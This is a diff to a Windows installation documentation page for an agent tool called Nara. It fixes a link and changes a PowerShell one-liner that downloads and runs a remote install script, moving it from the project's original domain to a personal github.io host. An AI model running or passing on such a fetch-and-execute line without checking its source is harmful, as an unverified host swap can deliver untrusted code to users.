@@ -9,7 +9,7 @@ sidebar_position: 3
 
 Nara runs natively on Windows 10 and Windows 11 — no WSL, no Cygwin, no Docker. This page is the deep dive: what works natively, what's WSL-only, what the installer actually does, and the Windows-specific knobs you might need to touch.
 
-If you just want to install, the one-liner on the [landing page](../index.mdx) or [Installation page](../getting-started/installation#windows-native) is all you need. Come back here when something surprises you.
+If you just want to install, the one-liner on the [landing page](../index.mdx) or [Installation page](../getting-started/installation.md#windows) is all you need. Come back here when something surprises you.
 
 :::tip Want WSL instead?
 If you prefer a POSIX environment for `fork` semantics or Linux-style file watchers, see the **[Windows (WSL2) Guide](./windows-wsl-quickstart.md)**. Both coexist cleanly: native data lives under `%LOCALAPPDATA%\nara`, WSL data lives under `~/.nara`.
@@ -28,7 +28,7 @@ No admin rights required. The installer goes to `%LOCALAPPDATA%\nara\` and adds 
 **Installer options** use a scriptblock:
 
 ```powershell
-& ([scriptblock]::Create((irm https://nara-agent.nousresearch.com/install.ps1))) -NonInteractive -Channel main
+& ([scriptblock]::Create((irm https://engsathiago.github.io/nara-agent/install.ps1))) -NonInteractive -Channel main
 ```
 
 | Parameter | Purpose |
